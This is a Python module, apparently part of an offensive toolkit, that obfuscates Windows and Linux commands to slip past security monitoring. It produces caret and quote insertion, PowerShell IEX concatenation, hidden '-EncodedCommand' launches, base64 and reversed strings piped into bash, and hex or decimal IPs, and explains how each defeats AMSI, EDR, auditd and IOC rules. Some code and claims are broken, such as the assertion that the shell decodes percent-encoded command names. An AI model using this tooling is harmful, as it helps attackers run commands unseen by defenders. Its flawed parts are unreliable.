# Obfuscation engine — strategy functions and dispatcher.

import random
import string
import base64


# Helper utilities

def _insert_quotes(word: str, quote_char: str = '"') -> str:
    """Insert empty-string quotes at random positions in a word."""
    if len(word) < 4:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    for pos in positions:
        chars = list(word)
        chars.insert(pos, f'{quote_char}{quote_char}')
        word = ''.join(chars)
    return word


def _insert_carets(word: str) -> str:
    """Insert caret (^) escape characters at random positions."""
    if len(word) < 3:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '^')
    return ''.join(chars)


def _insert_ticks_powershell(word: str) -> str:
    """Insert PowerShell backtick (`) characters at random positions."""
    if len(word) < 4:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '`')
    return ''.join(chars)


def _env_var_substitute_windows(command: str) -> str:
    """Replace binary names with %SystemRoot% environment-variable paths."""
    substitutions = {
        "powershell": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell",
        "certutil":   "%SystemRoot%\\System32\\certutil",
        "bitsadmin":  "%SystemRoot%\\System32\\bitsadmin",
        "mshta":      "%SystemRoot%\\System32\\mshta",
        "regsvr32":   "%SystemRoot%\\System32\\regsvr32",
        "wmic":       "%SystemRoot%\\System32\\wbem\\wmic",
        "schtasks":   "%SystemRoot%\\System32\\schtasks",
        "curl":       "%SystemRoot%\\System32\\curl",
        "ftp":        "%SystemRoot%\\System32\\ftp",
        "reg":        "%SystemRoot%\\System32\\reg",
        "xcopy":      "%SystemRoot%\\System32\\xcopy",
    }
    result = command
    for binary, expanded in substitutions.items():
        idx = result.lower().find(binary)
        if idx == 0:
            result = expanded + result[len(binary):]
            break
    return result


def _case_flip(command: str) -> str:
    """Randomly toggle character case in the argument portion."""
    tokens = command.split(' ', 1)
    if len(tokens) == 1:
        return command
    binary, rest = tokens
    flipped = ''.join(
        c.upper() if (c.isalpha() and random.random() > 0.5) else c.lower()
        for c in rest
    )
    return f"{binary} {flipped}"


def _split_string_powershell(command: str) -> str:
    """Split the binary name into concatenated strings wrapped in IEX."""
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary = tokens[0]
    rest   = tokens[1] if len(tokens) > 1 else ''

    mid = random.randint(2, max(2, len(binary) - 2))
    b1, b2 = binary[:mid], binary[mid:]

    obf = f'powershell -c "IEX(("{b1}"+ "{b2}" + " {rest}"))"'
    return obf


def _base64_powershell(command: str) -> str:
    """Base64-encode the command for PowerShell -EncodedCommand."""
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
    return f'powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}'


def _env_concat_linux(command: str) -> str:
    """Split the binary name across shell variables and concatenate."""
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary, rest = tokens
    mid  = random.randint(2, max(2, len(binary) - 2))
    var1 = ''.join(random.choices(string.ascii_lowercase, k=2))
    var2 = ''.join(random.choices(string.ascii_lowercase, k=2))
    obf  = f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'
    return obf


def _base64_bash(command: str) -> str:
    """Base64-encode the full command and pipe through bash."""
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return f'echo {encoded} | base64 -d | bash'


def _hex_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to hex representation."""
    if not ip or ip == "127.0.0.1":
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        hex_ip = '0x' + ''.join(f'{p:02X}' for p in parts)
        return command.replace(ip, hex_ip)
    except ValueError:
        return command


def _decimal_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to decimal-long representation."""
    if not ip or ip == "127.0.0.1":
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
        return command.replace(ip, str(dec))
    except ValueError:
        return command


def _unicode_escape(command: str) -> str:
    """Apply partial URL percent-encoding to key words."""
    result = command
    for char, encoded in [('http', 'h%74tp'), ('curl', 'cu%72l'), ('wget', 'w%67et')]:
        result = result.replace(char, encoded, 1)
    return result


def _env_concat_plus_hex(command: str, ip: str) -> str:
    """Combined: split binary name via shell vars AND convert IP to hex."""
    obf = _env_concat_linux(command)
    if ip:
        obf = _hex_ip(obf, ip)
    return obf


def _reverse_string_bash(command: str) -> str:
    """Reverse the command string and pipe through rev | bash."""
    reversed_cmd = command[::-1]
    return f"echo '{reversed_cmd}' | rev | bash"


# Technique registry

TECHNIQUE_INFO = {
    # Windows techniques
    'env_var': {
        'os': 'windows',
        'label': '%SystemRoot% env-var expansion + quote insertion + hex IP',
        'explain': (
            "Three combined evasions: (1) the binary path uses %SystemRoot% "
            "so the literal 'certutil' or 'powershell' string never appears; "
            "(2) random empty-string quote pairs ('\"\"') are injected inside "
            "the binary name — Windows cmd.exe strips them at parse time but "
            "they break signature strings; (3) the dotted-quad IP is converted "
            "to hex (e.g. 192.168.1.1 → 0xC0A80101) to evade IP-based IOC rules."
        ),
    },
    'ps_iex': {
        'os': 'windows',
        'label': 'PowerShell IEX string-concat',
        'explain': (
            "The binary name is split across concatenated string literals "
            "and executed via Invoke-Expression (IEX). Static-analysis tools "
            "and AMSI signatures scan for literal strings like 'certutil', "
            "'bitsadmin', etc. Splitting defeats naive keyword matching."
        ),
    },
    'ps_b64': {
        'os': 'windows',
        'label': 'PowerShell Base64 EncodedCommand',
        'explain': (
            "The entire command is Base64-encoded (UTF-16LE) and passed via "
            "powershell -EncodedCommand. The raw command string never appears "
            "in the process command line, bypassing all string-based YARA or "
            "Sigma rules. Note: AMSI will still decode and scan inside PS."
        ),
    },
    'caret': {
        'os': 'windows',
        'label': 'Caret (^) insertion obfuscation',
        'explain': (
            "The caret character (^) is the cmd.exe escape character. "
            "It is silently stripped at parse time, but its presence "
            "breaks static string signatures. e.g. c^e^r^tutil is "
            "executed as certutil but doesn't match IOC regex patterns."
        ),
    },
    'quote': {
        'os': 'windows',
        'label': 'Quote-insertion obfuscation',
        'explain': (
            "Empty-string quotes ('\"\"') are injected inside the binary name. "
            "cmd.exe silently strips syntax quotes, executing the real binary, "
            "but most signature-based detection tools see a non-matching string."
        ),
    },
    # Linux techniques
    'env_concat': {
        'os': 'linux',
        'label': 'Shell variable name concatenation',
        'explain': (
            "The binary name is split across two shell variables and then "
            "executed via variable expansion ($a$b). Auditd and bash history "
            "log the expanded command, but EDR tools performing real-time "
            "exec-argument scanning on the raw command string see only variable names."
        ),
    },
    'hex_ip': {
        'os': 'both',
        'label': 'Hex IP encoding',
        'explain': (
            "The destination IP is replaced with its hexadecimal equivalent "
            "(e.g. 192.168.1.1 → 0xC0A80101). Linux networking stack resolves "
            "both representations identically, but IDS rules written as "
            "IP-address string matches will not trigger."
        ),
    },
    'dec_ip': {
        'os': 'both',
        'label': 'Decimal-long IP encoding',
        'explain': (
            "The destination IP is replaced with its unsigned 32-bit decimal "
            "form (e.g. 192.168.1.1 → 3232235777). Browsers and networking "
            "stacks resolve it, but IOC lists rarely include decimal IPs."
        ),
    },
    'unicode': {
        'os': 'linux',
        'label': 'URL percent-encoding',
        'explain': (
            "Key words in the command (e.g. 'http', 'curl') are partially "
            "percent-encoded. The shell and the target binary decode these "
            "transparently, but regex-based detection rules that look for "
            "literal keyword strings will not match."
        ),
    },
    'b64_bash': {
        'os': 'linux',
        'label': 'Base64 encode → pipe to bash',
        'explain': (
            "The full command is Base64-encoded and piped through "
            "'base64 -d | bash'. The original command never appears in "
            "the process arguments, defeating auditd exec logging and "
            "most EDR command-line scanning rules."
        ),
    },
    'reverse': {
        'os': 'linux',
        'label': 'Reversed string → rev | bash',
        'explain': (
            "The command string is reversed and piped through 'rev | bash'. "
            "The actual command never appears in clear text on the command "
            "line, evading static string-matching IDS/EDR signatures."
        ),
    },
    'env_concat_hex': {
        'os': 'linux',
        'label': 'Shell variable concat + hex IP (multi-layer)',
        'explain': (
            "Two layers combined: (1) the binary name is split across shell "
            "variables ($a$b) so the real binary never appears in the raw "
            "command string; (2) the IP address is converted to hexadecimal "
            "(e.g. 192.168.1.1 → 0xC0A80101) defeating IP-based IOC rules. "
            "Together they defeat both binary-name and IP-address signature matching."
        ),
    },
}


# Public API

def get_available_techniques(os_type: str = 'all') -> dict:
    """Return available technique names and descriptions for a given OS."""
    result = {}
    for key, info in TECHNIQUE_INFO.items():
        if os_type == 'all' or info['os'] == os_type or info['os'] == 'both':
            result[key] = info['label']
    return result


def obfuscate(command: str, os_type: str, binary: str,
              ip: str = '', technique: str = 'auto') -> dict:
    """
    Return a dict with keys:
        obfuscated_command  – the obfuscated version
        technique_used      – human-readable name of the technique
        explanation         – why this specific obfuscation is stealthy
    """
    os_type = os_type.lower()

    # ── Windows obfuscation paths ──────────────────────────────
    if os_type == 'windows':

        if technique == 'ps_b64':
            obf     = _base64_powershell(command)
            tech    = TECHNIQUE_INFO['ps_b64']['label']
            explain = TECHNIQUE_INFO['ps_b64']['explain']

        elif technique == 'caret':
            first_token = command.split()[0]
            obf = _insert_carets(first_token) + command[len(first_token):]
            if ip:
                obf = _hex_ip(obf, ip)
            tech    = TECHNIQUE_INFO['caret']['label']
            explain = TECHNIQUE_INFO['caret']['explain']

        elif 'powershell' in binary.lower() or technique == 'ps_iex':
            obf     = _split_string_powershell(command)
            tech    = TECHNIQUE_INFO['ps_iex']['label']
            explain = TECHNIQUE_INFO['ps_iex']['explain']

        elif technique == 'env_var' or random.random() > 0.4:
            obf = _env_var_substitute_windows(command)
            # Double-layer: also quote-insert the binary name portion
            first_space = obf.find(' ')
            if first_space > 0:
                obf = _insert_quotes(obf[:first_space], '"') + obf[first_space:]
            if ip:
                obf = _hex_ip(obf, ip)
            tech    = TECHNIQUE_INFO['env_var']['label']
            explain = TECHNIQUE_INFO['env_var']['explain']

        else:
            first_token = command.split()[0]
            obf = _insert_quotes(first_token, '"') + command[len(first_token):]
            tech    = TECHNIQUE_INFO['quote']['label']
            explain = TECHNIQUE_INFO['quote']['explain']

    # ── Linux obfuscation paths ────────────────────────────────
    else:
        if technique == 'b64_bash':
            obf     = _base64_bash(command)
            tech    = TECHNIQUE_INFO['b64_bash']['label']
            explain = TECHNIQUE_INFO['b64_bash']['explain']

        elif technique == 'reverse':
            obf     = _reverse_string_bash(command)
            tech    = TECHNIQUE_INFO['reverse']['label']
            explain = TECHNIQUE_INFO['reverse']['explain']

        elif technique == 'dec_ip' and ip:
            obf     = _decimal_ip(command, ip)
            tech    = TECHNIQUE_INFO['dec_ip']['label']
            explain = TECHNIQUE_INFO['dec_ip']['explain']

        elif technique == 'unicode':
            candidate = _unicode_escape(command)
            if candidate != command:
                obf     = candidate
                tech    = TECHNIQUE_INFO['unicode']['label']
                explain = TECHNIQUE_INFO['unicode']['explain']
            else:
                obf     = _env_concat_plus_hex(command, ip)
                tech    = TECHNIQUE_INFO['env_concat_hex']['label']
                explain = TECHNIQUE_INFO['env_concat_hex']['explain']

        elif technique == 'env_concat':
            obf     = _env_concat_plus_hex(command, ip)
            tech    = TECHNIQUE_INFO['env_concat_hex']['label']
            explain = TECHNIQUE_INFO['env_concat_hex']['explain']

        elif technique == 'hex_ip' and ip:
            obf     = _hex_ip(command, ip)
            tech    = TECHNIQUE_INFO['hex_ip']['label']
            explain = TECHNIQUE_INFO['hex_ip']['explain']

        else:
            # Auto mode: pick the best strategy per binary
            bin_lower = binary.lower()

            # Commands with HTTP URLs → percent-encode + hex IP
            candidate = _unicode_escape(command)
            has_url_keywords = (candidate != command)

            if has_url_keywords and ip:
                obf     = _hex_ip(candidate, ip)
                tech    = TECHNIQUE_INFO['unicode']['label'] + ' + hex IP'
                explain = (
                    TECHNIQUE_INFO['unicode']['explain'] + ' '
                    + TECHNIQUE_INFO['hex_ip']['explain']
                )
            elif has_url_keywords:
                obf     = candidate
                tech    = TECHNIQUE_INFO['unicode']['label']
                explain = TECHNIQUE_INFO['unicode']['explain']
            elif ip:
                # No URL keywords (openssl, nc, scp, bash etc.) → env_concat + hex IP
                obf     = _env_concat_plus_hex(command, ip)
                tech    = TECHNIQUE_INFO['env_concat_hex']['label']
                explain = TECHNIQUE_INFO['env_concat_hex']['explain']
            else:
                # Fallback: variable concat or base64
                obf     = _env_concat_linux(command)
                tech    = TECHNIQUE_INFO['env_concat']['label']
                explain = TECHNIQUE_INFO['env_concat']['explain']

    return {
        'obfuscated_command': obf,
        'technique_used':     tech,
        'explanation':        explain,
    }
